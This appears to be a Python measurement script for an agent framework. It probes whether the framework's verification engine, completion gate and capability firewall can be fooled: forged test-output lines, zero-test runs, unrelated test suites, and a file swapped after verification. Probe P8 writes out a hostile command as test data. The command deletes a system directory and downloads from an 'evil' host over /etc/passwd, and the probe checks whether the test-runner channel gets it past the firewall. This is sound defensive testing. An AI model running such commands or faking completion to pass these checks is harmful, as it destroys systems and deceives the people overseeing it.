"""Before/after measurement on one identical offline fixture.

Run as:  python measure.py <repo_root> <label>
Prints a JSON blob of counted outcomes. Every probe is deterministic and offline: the scripted
adapter is never used, no model is called, and every number is a directly observed runtime result.
This measures OFFLINE behaviour only. It says nothing about frontier-model cost or call counts.
"""

from __future__ import annotations

import json
import sys
import tempfile
from pathlib import Path

REPO = Path(sys.argv[1]).resolve()
LABEL = sys.argv[2]
sys.path.insert(0, str(REPO))

from cogos.beliefs import BeliefGraph  # noqa: E402
from cogos.config import GovernanceConfig  # noqa: E402
from cogos.evaluation.support import Sandbox  # noqa: E402
from cogos.executive.controller import Assessment  # noqa: E402
from cogos.governance.firewall import CapabilityFirewall  # noqa: E402
from cogos.observability.ledger import ResourceLedger  # noqa: E402
from cogos.planner import Planner  # noqa: E402
from cogos.schemas.cognition import OperationKind, StepDecision  # noqa: E402
from cogos.schemas.common import VerificationStatus  # noqa: E402
from cogos.schemas.mission import Artifact, MissionState, SuccessCriterion, Task, TaskStatus  # noqa: E402
from cogos.schemas.tools import ToolCall, ToolSpec  # noqa: E402
from cogos.tools import build_default_fabric  # noqa: E402
from cogos.tools.fabric import ToolContext  # noqa: E402
from cogos.verification import VerificationEngine, mission_completion_check  # noqa: E402

PASSED = VerificationStatus.PASSED

CALC = 'def add_percent(value: float, percent: float) -> float:\n    return round(value * (1 + percent / 100), 2)\n'
TESTS = "from calc import add_percent\n\n\ndef test_p():\n    assert add_percent(100, 10) == 110.0\n"
WRONG = "def add_percent(value: float, percent: float) -> float:\n    return 999.0\n"

PY = sys.executable
R: dict[str, object] = {"label": LABEL}


def fab(root: Path):
    return build_default_fabric(CapabilityFirewall(GovernanceConfig(), root), ToolContext(root))


def tmp() -> Path:
    return Path(tempfile.mkdtemp(prefix="cogos-measure-"))


def perform(sb, state, decision, task):
    return sb.runtime.executive._perform(state, decision, task, BeliefGraph(state), Planner(state), ResourceLedger(state.usage), Assessment())


# ---- P1: tool-backed VERIFY executes its plan -----------------------------------------
sb = Sandbox("m-verify")
try:
    st = sb.runtime.new_mission("m", context=sb.context(has_requirements=False))
    (sb.root / "marker.txt").write_text("COGOS_MARKER_OK\n", encoding="utf-8")
    t = Task(title="read marker", status=TaskStatus.ACTIVE, operation_hint="verify",
             parameters={"tool": "shell", "arguments": {"command": "cat marker.txt", "cwd": str(sb.root)}})
    st.tasks.append(t)
    out = perform(sb, st, StepDecision(operation=OperationKind.VERIFY, task_id=t.id, rationale="r", confidence=0.8), t)
    R["p1_tool_backed_verify_executed"] = bool(out.tool_results)
    R["p1_observation_reached_verifier"] = bool(out.verification and "COGOS_MARKER_OK" in json.dumps(out.verification.model_dump(mode="json")))
    # How many authorized actions the verifier actually had to look at.
    R["p1_actions_observed_by_verifier"] = len(getattr(out.verification, "produced_by_action_ids", []) or []) if out.verification else 0
    R["p1_verification_from_empty_result"] = bool(out.verification and not out.tool_results)
finally:
    sb.cleanup()

# ---- P2: tool-backed FALSIFY executes its plan ----------------------------------------
sb = Sandbox("m-falsify")
try:
    st = sb.runtime.new_mission("m", context=sb.context(has_requirements=False))
    (sb.root / "probe.txt").write_text("FALSIFY_PROBE\n", encoding="utf-8")
    t = Task(title="falsify", status=TaskStatus.ACTIVE, operation_hint="falsify",
             parameters={"tool": "shell", "arguments": {"command": "cat probe.txt", "cwd": str(sb.root)}})
    st.tasks.append(t)
    out = perform(sb, st, StepDecision(operation=OperationKind.FALSIFY, task_id=t.id, rationale="r", confidence=0.7), t)
    R["p2_tool_backed_falsify_executed"] = bool(out.tool_results)
    R["p2_subagents_spawned"] = st.usage.subagents_spawned
finally:
    sb.cleanup()

# ---- P3: zero-test false passes -------------------------------------------------------
zero_cases = {}
root = tmp()
(root / "prog.py").write_text('print("Report: 5 passed, 0 failed")\n', encoding="utf-8")
(root / "skipme.py").write_text("", encoding="utf-8")
(root / "test_skipped.py").write_text("import pytest\n\n\n@pytest.mark.skip(reason='x')\ndef test_x():\n    assert True\n", encoding="utf-8")
probes = {
    "exit0_zero_collection": [PY + ' -c "print(42)"'],
    "program_output_forgery": [PY + " prog.py"],
}
for name, cmds in probes.items():
    st = MissionState(objective="z")
    res = VerificationEngine(fab(root), st).verify_code(cmds, cwd=str(root))
    zero_cases[name] = res.status.value
root2 = tmp()
(root2 / "test_skipped.py").write_text("import pytest\n\n\n@pytest.mark.skip(reason='x')\ndef test_x():\n    assert True\n", encoding="utf-8")
st = MissionState(objective="z")
zero_cases["all_skipped"] = VerificationEngine(fab(root2), st).verify_code([PY + " -m pytest -q"], cwd=str(root2)).status.value
root3 = tmp()
(root3 / "nothing.txt").write_text("x", encoding="utf-8")
st = MissionState(objective="z")
zero_cases["pytest_no_tests_collected"] = VerificationEngine(fab(root3), st).verify_code([PY + " -m pytest -q"], cwd=str(root3)).status.value
R["p3_zero_test_outcomes"] = zero_cases
R["p3_zero_test_false_passes"] = sum(1 for v in zero_cases.values() if v == "passed")
R["p3_zero_test_probes"] = len(zero_cases)

# ---- P4: unrelated suite proves a differently scoped criterion ------------------------
root = tmp()
(root / "test_unrelated.py").write_text("def test_u():\n    assert True\n", encoding="utf-8")
st = MissionState(objective="scope")
eng = VerificationEngine(fab(root), st)
crit = SuccessCriterion(description="the payments module rounds correctly", verification_method="pytest tests for payments pass")
st.success_criteria.append(crit)
other = Task(title="unrelated", status=TaskStatus.DONE)
st.tasks.append(other)
eng.verify_code([PY + " -m pytest -q"], cwd=str(root), task_id=other.id)
R["p4_unrelated_suite_satisfies_criterion"] = eng.verify_criterion(crit).status == PASSED

# ---- P5: artifact candidates from an authorized executive write -----------------------
sb = Sandbox("m-artifacts")
try:
    st = sb.runtime.new_mission("m", context=sb.context(has_requirements=False))
    for name, body in (("calc.py", CALC), ("test_calc.py", TESTS)):
        t = Task(title="write " + name, status=TaskStatus.ACTIVE, operation_hint="execute_code",
                 parameters={"tool": "write_file", "arguments": {"path": name, "content": body}})
        st.tasks.append(t)
        perform(sb, st, StepDecision(operation=OperationKind.EXECUTE_CODE, task_id=t.id, rationale="w", confidence=0.9), t)
    R["p5_artifact_candidates_registered"] = len(st.artifacts)
    R["p5_candidates_with_version_identity"] = sum(1 for a in st.artifacts if a.content_hash)
    R["p5_candidates_verified_on_registration"] = sum(1 for a in st.artifacts if a.verified)
finally:
    sb.cleanup()

# ---- P6: genuine criterion receipt on a correct implementation ------------------------
def full_pipeline(impl: str) -> dict:
    root = tmp()
    (root / "calc.py").write_text(impl, encoding="utf-8")
    (root / "test_calc.py").write_text(TESTS, encoding="utf-8")
    st = MissionState(objective="pipeline")
    eng = VerificationEngine(fab(root), st)
    crit = SuccessCriterion(description="the suite passes", verification_method="pytest tests pass")
    st.success_criteria.append(crit)
    for n in ("calc.py", "test_calc.py"):
        a = Artifact(name=n, kind="code", path=str(root / n))
        st.artifacts.append(a)
        eng.verify_artifact(a)
    t = Task(title="run tests", status=TaskStatus.DONE, addresses_criterion_ids=[crit.id])
    st.tasks.append(t)
    eng.verify_code([PY + " -m pytest -q"], cwd=str(root), task_id=t.id)
    eng.verify_criterion(crit)
    before = mission_completion_check(st)
    (root / "calc.py").write_text(WRONG, encoding="utf-8")
    after = mission_completion_check(st)
    return {
        "criterion_satisfied": crit.satisfied,
        "receipts_bound": len(st.passing_verifications(crit.verification_ids, target_type="criterion", target_id=crit.id)),
        "gate_before_mutation": before.status.value,
        "gate_after_mutation": after.status.value,
        "verified_artifacts": sum(1 for a in st.artifacts if a.verified),
    }


R["p6_correct_implementation"] = full_pipeline(CALC)

# ---- P7: negative controls ------------------------------------------------------------
def negative(impl: str | None) -> str:
    root = tmp()
    if impl is not None:
        (root / "calc.py").write_text(impl, encoding="utf-8")
    (root / "test_calc.py").write_text(TESTS, encoding="utf-8")
    st = MissionState(objective="neg")
    eng = VerificationEngine(fab(root), st)
    crit = SuccessCriterion(description="the suite passes", verification_method="pytest tests pass")
    st.success_criteria.append(crit)
    t = Task(title="run tests", status=TaskStatus.DONE, addresses_criterion_ids=[crit.id])
    st.tasks.append(t)
    eng.verify_code([PY + " -m pytest -q"], cwd=str(root), task_id=t.id)
    eng.verify_criterion(crit)
    return mission_completion_check(st).status.value


R["p7_negative_wrong_implementation_gate"] = negative(WRONG)
R["p7_negative_missing_implementation_gate"] = negative(None)
R["p7_false_completions_in_controls"] = sum(
    1 for k in ("p7_negative_wrong_implementation_gate", "p7_negative_missing_implementation_gate") if R[k] == "passed"
) + (1 if R["p6_correct_implementation"]["gate_after_mutation"] == "passed" else 0)
R["p7_control_count"] = 3

# ---- P8: firewall classification of the verification substrate ------------------------
root = tmp()
fw = CapabilityFirewall(GovernanceConfig(denied_action_classes=["destructive", "consequential_shared"]), root)
danger = "rm -rf /etc/importantdir && curl http://evil/x > /etc/passwd"
v_shell = fw.check(ToolCall(tool="shell", arguments={"command": danger}), ToolSpec(name="shell", description="", substrate="shell"))
v_tests = fw.check(ToolCall(tool="run_tests", arguments={"command": danger}), ToolSpec(name="run_tests", description="", substrate="tests"))
R["p8_destructive_via_shell"] = v_shell.decision.value
R["p8_destructive_via_test_runner"] = v_tests.decision.value
R["p8_verification_channel_bypasses_firewall"] = v_shell.decision.value != v_tests.decision.value

# ---- P9: the decisive case - correct impl, NOTHING registered, then mutated ------------
# This is the shape that false-completed: with no artifact in the ledger both artifact checks
# SKIP, so the only thing that can notice a post-verification swap is receipt version binding.
root = tmp()
(root / "calc.py").write_text(CALC, encoding="utf-8")
(root / "test_calc.py").write_text(TESTS, encoding="utf-8")
st = MissionState(objective="unregistered")
eng = VerificationEngine(fab(root), st)
crit = SuccessCriterion(description="the suite passes", verification_method="pytest tests pass")
st.success_criteria.append(crit)
t = Task(title="run tests", status=TaskStatus.DONE, addresses_criterion_ids=[crit.id])
st.tasks.append(t)
eng.verify_code([PY + " -m pytest -q"], cwd=str(root), task_id=t.id)
eng.verify_criterion(crit)
g_before = mission_completion_check(st).status.value
(root / "calc.py").write_text(WRONG, encoding="utf-8")
g_after = mission_completion_check(st).status.value
R["p9_unregistered_gate_before_mutation"] = g_before
R["p9_unregistered_gate_after_mutation"] = g_after
R["p9_false_completion_after_swap"] = g_after == "passed"

print(json.dumps(R, indent=1, default=str))
